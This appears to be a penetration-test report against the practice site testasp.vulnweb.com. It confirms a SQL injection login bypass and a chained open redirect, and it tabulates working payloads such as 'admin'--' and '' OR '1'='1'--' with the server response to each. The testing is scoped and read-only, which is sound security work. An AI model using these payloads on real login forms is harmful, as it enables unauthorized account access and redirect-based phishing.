# r2_auth — Login.asp SQLi auth-bypass + open-redirect chain (testasp.vulnweb.com)

Date: 2026-09-28 (UTC) | Target: http://testasp.vulnweb.com (in-scope only)
Requests issued: 24 total (well under the ~300 budget). All POSTs went to Login.asp only.

## Verdict: CONFIRMED (all 4 sub-goals)

### 1) SQLi auth bypass — CONFIRMED (5/5 payloads)
Controls (prove the SQL is actually reached and that only ">=1 row" flips the branch):

| # | payload (tfUName / tfUPass)                      | status | Location          | note |
|---|--------------------------------------------------|--------|-------------------|------|
| C1| nosuchuser_zzz / nosuchpass_zzz                  | 200    | —                 | "Invalid login!" (0 rows) |
| C2| (empty) / (empty)                                | 200    | —                 | no SQL at all (short-circuit, Login.asp:31) |
| C3| admin / (empty)                                  | 200    | —                 | no SQL at all |
| S7| admin / definitely_wrong_pw                       | 200    | —                 | well-formed query, 0 rows -> no bypass |
| S1| admin'--                                          | 302    | Default.asp       | BYPASS | 
| S2| ' OR '1'='1'--                                    | 302    | Default.asp       | BYPASS |
| S3| zz' OR 1=1--                                      | 302    | Default.asp       | BYPASS |
| S4| ' OR '1'='1 (both fields)                         | 302    | Default.asp       | BYPASS (no comment needed) |
| S5| x' OR '1'='1'--  (password field only)            | 302    | Default.asp       | BYPASS |
| S6| admin'                                            | 500    | —                 | syntax error -> proves raw interpolation into MSSQL |

- S6's 500 is the strongest white-box-to-black-box corroboration: an unbalanced quote
  breaks the query at SQL Server (not a client-side/parameterised path).
- S1 returning a row implies a user literally named `admin` exists (inference only,
  no data extracted). S2-S5 do not depend on any specific account.

### 2) What the bypassed session grants — CONFIRMED (read-only observation)
Server-side session is real (ASPSESSIONIDCCCTQDSA persists across requests via -b/-c jar).

| page | with bypass session | anonymous |
|------|--------------------|-----------|
| Default.asp  | 1x "logout admin'-- " menu item, 3470 B | 0x logout, 3538 B |
| showforum.asp?id=1 | 1x logout menu **+ the post form (tfSubject + 2 textareas)**, 4147 B | 0x logout, **no form**, 3077 B |

- The post form appears ONLY with the session -> the bypass unlocks an authenticated
  capability (posting) that anon users do not get. Reported as "실제로 쓰기 가능해 보임";
  NO post was submitted (hard rule).
- Menu output is UNESCAPED (`logout admin'-- ` echoed raw) -> stored/reflected XSS
  candidate via Session.Contents("uname") (Login.asp:80 / Default.asp:55 / showforum).

### 3) Open redirect chained with the bypass — CONFIRMED
| # | request | status | Location |
|---|---------|--------|----------|
| R0 control | POST Login.asp?RetURL=http://example.com/ + BOGUS creds | 200 | — (redirect is gated inside `if not rs.EOF`) |
| R4 control | GET Login.asp?RetURL=http://example.com/                | 200 | — (GET never redirects) |
| R1 | POST Login.asp?RetURL=http://example.com/ + SQLi bypass    | 302 | `http://example.com/` |
| R2 | same, RetURL=//example.com/                                | 302 | `//example.com/` |
| R3 | same, RetURL=https%3A%2F%2Fexample.com%2F                  | 302 | `https://example.com/` |
| R5 | GET /Logout.asp?RetURL=http://example.com/ (fresh jar)      | 302 | `http://example.com/` |
| R6 | GET /Logout.asp?RetURL=//example.com/                       | 302 | `//example.com/` |

- Chaining is real and matches the source: Response.Redirect(Request.QueryString("RetURL"))
  with no allow-list/validation on either Login.asp:39 or Logout.asp:30.
- R5/R6 needed NO authentication at all -> Logout.asp is the easier open-redirect primitive;
  Login.asp's RetURL only fires on successful auth, which is exactly why the SQLi bypass
  must be chained in.
- No `Location` value was ever followed off-site; example.com was used as the marker only.

### 4) Negative results / caveats
- No verbose SQL error leaked on the syntax-error 500 (generic IIS 8.5 page) -> no
  error-based extraction through this vector.
- Empty-field POST and GET requests never reach the SQL (double-gated at Login.asp:31).
- No CSRF token on the login form; action="" (self-POST).
- Deliberately NOT done: Register.asp POST, any thread/post write, any row modification.
  showforum.asp GET is safe by source inspection — the destructive `DELETE FROM threads/posts`
  branch (showforum.asp:54-59) is gated behind `REQUEST_METHOD="POST"` AND non-empty
  tfSubject/tfText AND Session.uname<>"".

## Artifacts
- step1_baseline_controls.sh / step2_sqli_login.sh / step3_session_and_redirect.sh / step5_evidence.sh
- step{1,2,3,5}_console.log (command logs)
- hdr_*.txt (raw response headers per request), body_*.html, cj_*.txt (cookie jars)
- evidence_headers.txt (consolidated raw header blocks)
